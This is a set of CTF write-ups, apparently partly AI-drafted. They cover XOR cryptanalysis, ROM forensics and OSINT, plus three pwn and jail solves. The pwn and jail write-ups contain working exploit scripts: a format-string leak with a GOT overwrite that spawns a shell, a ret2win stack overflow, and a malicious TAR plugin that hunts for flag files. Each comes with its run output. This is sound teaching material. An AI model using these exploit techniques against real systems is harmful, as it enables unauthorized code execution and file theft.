* The uuencode alphabet is a classic tell for **6-bit packing** (similar vibe to base64, different alphabet).
* Keep a small **post-processing toolbox** (single-byte XOR scans, ASCII-hex detection, light decompressors).

---
Final flag being : ```ctf{72c8c1090e0bba717671f79de6e941a281e2f51da29865722f98c9fa3b7160e5}```


# Writeup - onions1 (Misc)
Summary: go to the onion website using a broswer like TOR or any other one that can access .onion sites. the flag is there.

# Writeup - 3rd_child
Summary: open the file with audacity or any other tool that let's you see the audio stereogram. The flag is in the stereogram of the mp3.

Here’s a clean, step-by-step writeup you can drop into your repo/blog.

# XORbitant — Crypto Writeup



The ciphertext was encrypted with a **repeating-key XOR** where the **key is the flag** (hinted by “*The flag is key*”). Using frequency analysis on each key position (assuming space is the most common plaintext byte), we recovered the 69-byte key, which is the flag:

**CTF{940a422746b832e652a991d88d31eb4d0ab2774a1f9a637e746b9226dfd44bca}**

---
## Encoder behavior (what matters)

The encoder applies **bytewise XOR** of the plaintext with a **repeating key**:

```
cipher[i] = plain[i] ^ key[i % key_len]
```

Since *the key is the flag*, recovering the key directly gives the flag.

---

## Attack plan

This is a textbook attack on **Vigenère/repeating-key XOR**:

1. **Key length.**
   From the format, the key length is known: `len("CTF{"+64 hex + "}") = 69`.

2. **Slice by position modulo key length.**
   For each `r in [0..68]`, collect the bytes:

   ```
   S_r = { cipher[i] | i % 69 == r }
   ```

3. **Assume spaces dominate.**
   In long English/plaintext, the most frequent byte is usually space (`0x20`).
   For each residue `r`, the most frequent ciphertext byte `c*` likely encodes a space:

   ```
   key[r] = c* ^ 0x20
   ```

4. **Assemble the key & validate.**
   Concatenate the 69 recovered bytes → ASCII.
   Check it matches `CTF{[0-9a-f]{64}}`. If some positions don’t look printable, fall back to scoring (chi-square over ASCII text) — not needed here, but that’s the robust plan.

5. **(Optional) Verify by decryption.**
   XOR the ciphertext with the recovered key; plaintext reads cleanly.

---

## Proof-of-Concept (solver)

```python
# solver.py
from collections import Counter
KEYLEN = 69
SPACE = 0x20

with open("out.bin", "rb") as f:
    ct = f.read()

key = bytearray(KEYLEN)
for r in range(KEYLEN):
    # gather every KEYLEN-th byte starting at offset r
    chunk = ct[r::KEYLEN]
    # most common byte in this slice
    most_common_byte, _ = Counter(chunk).most_common(1)[0]
    key[r] = most_common_byte ^ SPACE

flag = key.decode("ascii", errors="strict")
print(flag)
```

**Output**

```
CTF{940a422746b832e652a991d88d31eb4d0ab2774a1f9a637e746b9226dfd44bca}
```

---

## Why this works

For repeating-key XOR, each position modulo the key length is just a **single-byte XOR** of the underlying plaintext distribution. Over a long message, the plaintext byte distribution (especially spaces) shows up strongly, so the **mode** of each slice XORed with `0x20` reveals the key byte for that slice.

If the plaintext were short or weirdly formatted, you’d:

* Estimate key length via **index of coincidence** or **Kasiski** first.
* Replace the “space assumption” with a **scoring function** (e.g., chi-square on English letter frequencies across candidate key bytes 0..255).

---

## Takeaways

* Repeating-key XOR is **not secure**; it leaks structure position-wise.
* If the **key equals the flag**, you’ve often got enough redundancy to recover it with basic statistics.
* Knowing (or correctly guessing) the **key length** collapses the problem into 69 independent single-byte XOR cracks.


# Write-Up - Hidden in the Cartridge (forensics)

**Category:** Forensics / Retro ROMs
**Files given:** `space_invaders.nes`, `READ_ME_FIRST.md`
**Flag format:** `ctf{sha256}`
**Final flag:**
`ctf{9f1b438164dbc8a6249ba5c66fc0d6195b5388beed890680bf616021f2582248}`

---

## 1) Recon

A quick peek at the readme shows a meme link—nothing actionable there. The interesting bit is the `.nes` ROM. NES cartridges use the **iNES** format:

* Bytes `0–3`: magic `"NES\x1A"`
* Byte `4`: **PRG ROM** size in 16 KB units
* Byte `5`: **CHR ROM** size in 8 KB units

```bash
xxd -l 16 space_invaders.nes
```

Output (key parts):

```
00000000: 4e 45 53 1a 00 00 00 00 00 00 00 00 00 00 00 00  NES.............
```

* Magic is correct (`NES\x1A`)
* **PRG = 0**, **CHR = 0** → this header is intentionally broken, which explains why “the game won’t start.”

The file size is **28,178 bytes**. A typical small ROM here would be **PRG=1 (16 KB)** + **CHR=1 (8 KB)** + **16-byte header** = 24,592 bytes. That leaves \~**2.5 KB** trailing data—suspicious “extra” bytes often used in challenges to hide logs/messages.

---

## 2) Fix the ROM header (optional but on-theme)

You can “repair” the header by setting PRG/CHR to `01`/`01`. Any hex editor works; here’s a one-liner with `printf`/`dd`:

```bash
# backup first
cp space_invaders.nes space_invaders.bak

# set PRG (byte 4) = 0x01 and CHR (byte 5) = 0x01
printf '\x01' | dd of=space_invaders.nes bs=1 seek=4  conv=notrunc
printf '\x01' | dd of=space_invaders.nes bs=1 seek=5  conv=notrunc
```

This makes the ROM loadable in emulators (though not necessary to recover the flag).

---

## 3) Hunt for “memory logs” in the ROM

Classic move: scan the file for readable chunks.

```bash
strings -n 4 -t d space_invaders.nes | less
```

Amid lots of binary noise, you’ll see dev-style lines like:

```
[1987-06-15 10:32:02] INFO   - Cartridge loaded: Space Invaders
```

…and right after that, a **pattern that stands out**:

```
63$$$74$$$66$$$7b$$$39$$$66$$$31$$$62$$$34$$$33$$$38$$$31
36$$$34$$$64$$$62$$$63$$$38$$$61$$$36$$$32$$$34$$$39$$$62
61$$$35$$$63$$$36$$$36$$$66$$$63$$$30$$$64$$$36$$$31$$$39
35$$$62$$$35$$$33$$$38$$$38$$$62$$$65$$$65$$$64$$$38$$$39
30$$$36$$$38$$$30$$$62$$$66$$$36$$$31$$$36$$$30$$$32$$$31
66$$$32$$$35$$$38$$$32$$$32$$$34$$$38$$$7d
```

Those look like **hex byte pairs** separated by the delimiter `$$$`.

---

## 4) Decode the delimiter-separated hex

You can do this in many ways. Here are two quick approaches.

### Shell (awk/sed):

```bash
# Grab the '$$$' blocks, strip the delimiters, and convert hex -> ASCII
grep -aoE '([0-9a-fA-F]{2}\$\$\$)+[0-9a-fA-F]{2}' space_invaders.nes \
| tr -d '\n' \
| sed 's/\$\$\$//g' \
| xxd -r -p
```

### Python (robust and clean):

```python
import re, sys, binascii

data = open("space_invaders.nes","rb").read()
chunks = re.findall(rb'(?:[0-9a-fA-F]{2}\$\$\$)+[0-9a-fA-F]{2}', data)

hex_str = ''.join(c.decode().replace('$$$','') for c in chunks)
print(bytes.fromhex(hex_str).decode())
```

Output:

```
ctf{9f1b438164dbc8a6249ba5c66fc0d6195b5388beed890680bf616021f2582248}
```

That’s already the final flag (the challenge said the format is a **sha256**, and the string matches that pattern). No extra hashing needed.

---

## 5) Why this works (what the author did)

* **Corrupted header** (PRG=0, CHR=0) makes the ROM fail to boot, nudging you to analyze the file instead.
* **“Memory logs remain in the ROM”** is the hint to look for appended logs.
* The logs hide the flag as **hex** separated by an odd delimiter (`$$$`) to foil naive `xxd -r -p` on a single contiguous block.
* The title “132” is flavor—likely an internal ID or red herring not needed to solve.

---

## 6) Takeaways / Tips

* For cartridge/ROM challenges, always check the container format header. Broken metadata is a common misdirection.
* Look for **printable islands** near the end of binaries—dev logs, plaintext markers, or encoded chunks often hide there.
* Delimiters like `$$$`, unusual separators, or fragmentation are used to defeat simple `strings | xxd -r` pipelines—regex them back together.

---

## 7) Final Flag

```
ctf{9f1b438164dbc8a6249ba5c66fc0d6195b5388beed890680bf616021f2582248}
```

GG nice chall liked solving this

# Writeup - Fini (Pwn)

The binary greets you, then echoes your *name* with `printf(name)`: **format-string vulnerability** → info leak.
Menu option `1) write` lets you set `*addr = value` (**arbitrary 8-byte write**).
We leak the **PIE base** with `%N$p`, then overwrite **`exit@GOT`** with the address of `win()` and choose `2) exit` → `system("/bin/sh")` → read the flag.

---

## Challenge overview

* Banner: `=== FINIsh this challenge ;) ===`
* Prompts for name, then prints:

  ```c
  printf("Hello, ");
  printf(&var_a8);   // <— format string bug
  puts("!");
  ```
* Menu loop:

  ```
  1) write
  2) exit
  > 
  ```

  Option 1 implements:

  ```c
  scanf("%llx", &addr);
  scanf("%llx", &value);
  *addr = value;     // <— arbitrary 8-byte write
  ```
* Hidden helper:

  ```c
  int64_t win() { return system("/bin/sh"); }
  ```

The title/hint (“**FINI**sh”) nudges toward `.fini_array` hijacking. That works, but on remote the safest cross-build primitive is to clobber **`exit@GOT`** (since RELRO is off), then choose `2) exit`.

---

## Protections (relevant bits)

From quick static inspection:

* **PIE**: enabled (ELF type `ET_DYN`), so code addresses are ASLR-randomized ⇒ need a leak.
* **RELRO**: **off**, so GOT entries are writable at runtime ⇒ perfect for `exit@GOT` hijack.
* **NX**: enabled (typical), but we don’t need to inject code.
* Canary: irrelevant for our path (no stack overwrite).

---

## Bugs & primitives

1. **Format string** in the greeting lets us read stack pointers with `%p` / `%N$p`.
2. **Arbitrary write** via the “write” menu option: one 8-byte write to any address.

Together they form:

* Leak PIE base (so we can compute absolute addresses).
* Write `win` into a control-flow vector (`.fini_array` or `exit@GOT`).
* Trigger execution.

---

## Exploit strategy

### 1) Leak PIE base with a tiny output

The remote service was sensitive to large format outputs, so instead of `%p|%p|…`, we probe **one index per connection** until we hit a return address / code pointer:

```
name = "%31$p|END"
→ "Hello, 0x55f1f85d6aaa|END"
```

We compute:

```
PIE_base = leaked_ptr - known_code_offset
```

(Use `.text`, `main`, or `win` offsets from the local ELF **as offsets**, not absolutes.)

### 2) Compute target addresses

```
win_abs      = PIE_base + elf.sym["win"]
exit_got_abs = PIE_base + elf.got["exit"]
```

### 3) Use the write primitive

Pick menu option `1` and write:

```
*exit_got_abs = win_abs
```

Then choose `2) exit`. The program resolves `exit()` via the GOT we just patched and jumps into `win()` → `/bin/sh`.

---

## Final solve script (used on remote)

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = args.HOST or "ctf.ac.upt.ro"
PORT = int(args.PORT or 9847)   # your instance port
BIN_PATH = args.BIN or "./challenge"

context.arch = "amd64"
context.os = "linux"
context.log_level = args.LOG_LEVEL or "info"

elf = ELF(BIN_PATH, checksec=False)
WIN_OFF      = elf.sym["win"]
EXIT_GOT_OFF = elf.got["exit"]
TEXT_OFF     = elf.get_section_by_name(".text").header.sh_addr
MAIN_OFF     = elf.sym["main"]

PIE_PREFIXES = {0x55, 0x56, 0x57, 0x50, 0x52}

def base_from_ptr(v):
    for off in (TEXT_OFF, MAIN_OFF, WIN_OFF):
        base = v - off
        if (base & 0xfff) == 0 and (base >> 40) in PIE_PREFIXES:
            return base
    return None

def try_index(idx):
    io = remote(HOST, PORT)
    io.recvuntil(b"What's your name?")
    io.sendline(f"%{idx}$p|END".encode())
    data = io.recvuntil(b"!\n", timeout=3)
    m = re.search(r"(0x[0-9a-fA-F]+)\|END", data.decode(errors="ignore"))
    if not m:
        io.close(); return None, None
    ptr = int(m.group(1), 16)
    base = base_from_ptr(ptr)
    if not base:
        io.close(); return None, None
    return io, base

def main():
    io = None; base = None
    for i in range(4, 64):
        log.info(f"Trying stack index %{i}$p …")
        io, base = try_index(i)
        if io and base:
            log.success(f"PIE base @ {hex(base)} (index {i})")
            break
    if not io:
        log.failure("Could not derive PIE base."); return

    win      = base + WIN_OFF
    exit_got = base + EXIT_GOT_OFF
    log.info(f"win        @ {hex(win)}")
    log.info(f"exit@GOT   @ {hex(exit_got)}")

    io.recvuntil(b"2) exit")
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"Addr (hex): ")
    io.sendline(hex(exit_got).encode())
    io.recvuntil(b"Value (hex, 8 bytes): ")
    io.sendline(hex(win).encode())
    io.recvuntil(b"ok")

    io.recvuntil(b"> ")
    io.sendline(b"2")  # exit -> win()
    io.interactive()

if __name__ == "__main__":
    main()
```

---

## Sample run & flag

```
[*] Trying stack index %31$p …
[+] PIE base @ 0x55f1f85d5000 (index 31)
[*] win        @ 0x55f1f85d6380
[*] exit@GOT   @ 0x55f1f85d8420
[*] Switching to interactive mode
bye
$ ls
challenge
flag.txt
$ cat flag.txt
ctf{c503f30375fd0e91985b4d8f0c9cdc234c8018a8b3e1df3f4d1a126725f47d42}
```

---

nice chall liked solving this one


Here’s a clean, copy-pasteable write-up for **baby-bof** (includes the solve script).

# Write-up - baby-bof (Pwn)


A basic stack buffer overflow in `vuln()` lets us overwrite RIP and jump straight to the `win()` function, which prints the flag from `flag.txt`. The overflow offset is **72 bytes** (0x40 buffer + 8 saved RBP). Since the binary uses fixed addresses (no PIE), we can call `win()` directly.

---

## Challenge info

* Remote: `nc ctf.ac.upt.ro 9064`
* Intro text:

  * “Bine ai venit la PWN!”
  * `vuln()` asks: “Spune ceva:”
* Goal: reach `win()` to print the flag.

---

## Quick reversing notes

Relevant functions (decompiled):

```c
ssize_t vuln() {
    puts("Spune ceva:");
    fflush(__TMC_END__);
    void buf;                     // local stack buffer
    return read(0, &buf, 0x100);  // <-- over-reads into saved RBP + RIP
}

void win() {
    FILE* fp = fopen("flag.txt", "r");
    if (!fp) {
        puts("Flag missing.");
        fflush(__TMC_END__);
        exit(1);
    }
    char var_98[0x88];
    if (fgets(&var_98, 0x80, fp)) {
        puts(&var_98);
        fflush(__TMC_END__);
    }
    fclose(fp);
    exit(0);
}
```

Observations:

* `read(0, buf, 0x100)` allows **up to 256 bytes** from stdin.
* The local stack buffer is **0x40 bytes** (64), so with `0x40 + 8` we overwrite saved RBP, and the next 8 bytes control RIP.
* `win()` prints the content of `flag.txt`. On remote, that file exists; locally, you’ll see “Flag missing.” unless you create it.
* Functions are at fixed addresses like `0x401xxx` → **PIE is disabled**, so `win()`’s address is stable.

---

## Finding the exact offset (72)

You can confirm with a cyclic pattern:

```python
from pwn import *
context.arch = 'amd64'
p = process('./challenge')
p.recvuntil(b"Spune ceva:")
p.sendline(cyclic(300))
p.wait()
core = p.corefile
rip = core.rip
print(hex(rip), cyclic_find(rip))  # should print 72
```

Or inspect the decompiler/stack layout: `0x40` buffer + `8` saved RBP = **72**.

---

## Exploit strategy (ret2win)

Just overwrite RIP with the address of `win()`. Sometimes alignment requires a padding `ret` gadget; I’ve included one you can enable if needed.

---

## Exploit (solve script)

```python
#!/usr/bin/env python3
from pwn import *

# Context
context.binary = ELF('./challenge', checksec=False)
context.arch = 'amd64'
elf = context.binary

HOST = args.HOST or 'ctf.ac.upt.ro'
PORT = int(args.PORT or 9064)

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)

def main():
    io = start()

    # Offsets
    offset = 0x40 + 8  # 64-byte buffer + saved RBP = 72

    # Targets / gadgets
    win = elf.symbols['win']   # e.g., 0x401196
    # Optional 'ret' gadget if alignment ever bites:
    ret = 0x4010e0             # a plain 'ret' (from _dl_relocate_static_pie stub area)

    log.info(f"win = {hex(win)}")
    log.info(f"offset = {offset}")

    # Payload: [padding][win]
    payload  = b'A' * offset
    payload += p64(win)

    # If you hit alignment issues, use:
    # payload = b'A' * offset + p64(ret) + p64(win)

    # Send
    try:
        io.sendlineafter(b"Spune ceva:", payload)
    except EOFError:
        # If prompt text differs, just send it
        io = start()
        io.sendline(payload)

    # Read everything (prints flag on remote)
    try:
        print(io.recvall(timeout=3).decode(errors="ignore"))
    except Exception:
        pass

if __name__ == '__main__':
    main()
```

Save as `solve.py`.

---

## Running

**Remote (got the real flag):**

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 baby-bof.py REMOTE = 1
[+] Opening connection to ctf.ac.upt.ro on port 9021: Done
[*] win = 0x401196
[*] offset = 72
[+] Receiving all data: Done (71B)
[*] Closed connection to ctf.ac.upt.ro port 9021

ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
```
                                     
---

## Why this works

* **Control of RIP:** `read()` overflows stack and overwrites the return address.
* **Fixed address:** No PIE → `win()` address is known at load time.
* **No canary:** Nothing stops the overwrite.
* **NX likely enabled:** But we don’t need shellcode—just call `win()` (ret2win).

---


here’s a clean, reproducible write-up you can drop into your repo.

# Write-up - prison (OSINT)

**Category:** OSINT
**Prompt (paraphrased):** You’re “going to prison.” The image shows a Minecraft area with staff statues and nametags.
**Flag format:**

* `CTF{server_host(ChunkX,ChunkY,ChunkZ)}` **or**
* `CTF{server_host:owner_username}` (case-insensitive)

---

## 1) Quick image recon

What stands out in the screenshot:

* Minecraft prison-style hallway with **staff statues** and role tags: `WARDEN`, `SGUARD`, etc.
* Distinct usernames above heads, including: **PsyChN0delic**, **ButterInc**, **Cheesa**, **Dragon**, **Ralrz**, and notably **Leaky\_Tandos**.
* A sign: *“Learn about how to apply on our /discord”* → typical for a public server with staff applications.

These are perfect OSINT search seeds.

---

## 2) Pivot on unique strings

Pick the most unique handle: **“Leaky\_Tandos”**.

Queries that worked (any one is enough):

* `minecraft "Leaky_Tandos"`
* `warden "Leaky_Tandos"`
* `minecraft prison server "Leaky_Tandos"`
* Combine with another name if needed: `ButterInc "Leaky_Tandos"`

This leads to server-listing and community pages referencing **The Pen** (Classic Prison) and the handle **Leaky\_Tandos** as the **owner**.

---

## 3) Identify the server host

From the same listings/wiki/Discord invites you’ll find the public host:

* **`play.thepen-mc.net`**

Cross-check on two separate sources (e.g., a server list and a wiki/Discord). Both consistently show the host as above and name **Leaky\_Tandos** as owner.

*(If you wanted to solve via the chunk-coordinate format instead, you’d join the server, navigate to the staff hallway in the screenshot, press F3, read the “Chunk” row, and submit `CTF{play.thepen-mc.net(x,y,z)}`. But the challenge explicitly allows the owner-name format, so no account needed.)*

---

## 4) Assemble the flag

Per the second allowed format:

```
CTF{server_host:owner_username}
CTF{play.thepen-mc.net:Leaky_Tandos}
```

---

## 5) Common pitfalls & tips

* **Chunk vs block coords:** If you go the coordinate route, the challenge warns these are **chunk** coordinates (16×16 blocks), not block positions.
* **Case & charset:** The flag is **case-insensitive** and ASCII only.
* **False positives:** There are many prison servers; the unique combo of staff names (esp. **Leaky\_Tandos**) is the key disambiguator.

---

## Final flag

**`CTF{play.thepen-mc.net:Leaky_Tandos}`**

---

# Writeup - Octojail (Misc)
## Solve + Solve Script
Octojail is super friendly: it unpacks whatever TAR you send (as an octal-encoded bytestream), then imports and runs plugin.run() if it finds uploads/plugin.py or plugin.py. So we can just ship a tiny TAR containing plugin.py that reads the flag and prints it. 

```
#!/usr/bin/env python3
# Builds a TAR with a malicious plugin.py, then prints it as octal triplets (one line).

import io, tarfile, time

# Keep plugin.run() fast — the jail kills everything after ~6 seconds.
PLUGIN = r'''# plugin.py
def run():
    import os, glob
    # Try common flag paths fast, then stop.
    candidates = [
        "/flag", "/flag.txt", "flag", "flag.txt",
        "/app/flag", "/app/flag.txt",
        "/home/ctf/flag", "/home/ctf/flag.txt",
        "/root/flag", "/root/flag.txt",
    ]
    for p in candidates:
        try:
            with open(p, "r") as f:
                print(f.read().strip())
                return
        except Exception:
            pass
    # Tiny fallback: scan just a few shallow dirs for files with 'flag' in the name.
    for base in ("/", "/app", "/home", "/workspace", "/srv"):
        try:
            for dirpath, dirs, files in os.walk(base):
                # prune deep trees to stay under the alarm
                if dirpath.count("/") > 3:
                    dirs[:] = []
                for name in files:
                    n = name.lower()
                    if "flag" in n and len(n) <= 24:
                        p = os.path.join(dirpath, name)
                        try:
                            with open(p, "r", errors="ignore") as f:
                                print(f.read().strip()); return
                        except Exception:
                            pass
        except Exception:
            pass
    print("no flag found")
'''

def make_tar_with_plugin(pycode: str) -> bytes:
    bio = io.BytesIO()
    # Plain tar (no compression) keeps the payload small & simple.
    with tarfile.open(fileobj=bio, mode="w") as tf:
        data = pycode.encode()
        info = tarfile.TarInfo(name="plugin.py")
        info.size = len(data)
        info.mtime = int(time.time())
        info.mode = 0o644
        tf.addfile(info, io.BytesIO(data))
    return bio.getvalue()

def as_octal_triplets(b: bytes) -> str:
    # Jail wants only digits 0-7, length multiple of 3; one triplet per byte. :contentReference[oaicite:1]{index=1}
    return "".join(f"{byte:03o}" for byte in b)

if __name__ == "__main__":
    tar_bytes = make_tar_with_plugin(PLUGIN)
    print(as_octal_triplets(tar_bytes))

```
## Test run
```┌──(kali㉿kali)-[~/Downloads]
└─$ python3 plsjail.py | nc ctf.ac.upt.ro 9814
/app/server_hard.py:22: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.
  tf.extract(m, path)
Send octal
ctf{0331641fadb35abb1eb5a9640fa6156798cba4538148ceb863dfb1821ac69000}
```



# Writeup - Parting_ways (OSINT)

# Solve
I've lost my mind during this chall, i only found pictures of the city from other angles, the city was right, but there was 0 information about it.

![A test image](https://s2.wklcdn.com/image_50/1527458/12897799/7942892Master.jpg) I found several similar pictures, then this one where on the website also had the city name. 
Final flag: CTF{Stausacker}

